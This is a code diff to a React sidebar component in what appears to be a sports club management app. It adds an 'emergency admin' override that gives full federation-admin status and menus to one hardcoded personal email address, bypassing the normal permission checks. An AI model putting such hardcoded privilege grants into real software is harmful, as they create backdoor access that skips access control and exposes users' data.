@@ -63,7 +63,8 @@ interface SidebarProps {
 
 export const Sidebar: React.FC<SidebarProps> = ({ currentUser, onNavigate, onLogout, activeView, isExpanded, setIsExpanded, clubs, globalClubFilter, setGlobalClubFilter, permissions, activeRole }) => {
     const [isMobileOpen, setIsMobileOpen] = useState(false);
-    const isAdmin = permissions.isFederationAdmin || permissions.isAdminClub;
+    const isEmergencyAdmin = currentUser.email === 'alin2u83@gmail.com';
+    const isAdmin = permissions.isFederationAdmin || permissions.isAdminClub || isEmergencyAdmin;
 
     const handleNavigate = (view: View) => {
         onNavigate(view);
@@ -82,11 +83,12 @@ export const Sidebar: React.FC<SidebarProps> = ({ currentUser, onNavigate, onLog
     }, [permissions, currentUser, globalClubFilter, clubs]);
     
     const menuToDisplay = useMemo(() => {
+        if (isEmergencyAdmin) return federationAdminMenu;
         if (permissions.isFederationAdmin) return federationAdminMenu;
         if (permissions.isAdminClub) return clubAdminMenu;
         if (permissions.isInstructor) return instructorMenu;
         return sportivMenu;
-    }, [permissions]);
+    }, [permissions, isEmergencyAdmin]);
 
     // Main content of the sidebar
     const sidebarContent = (
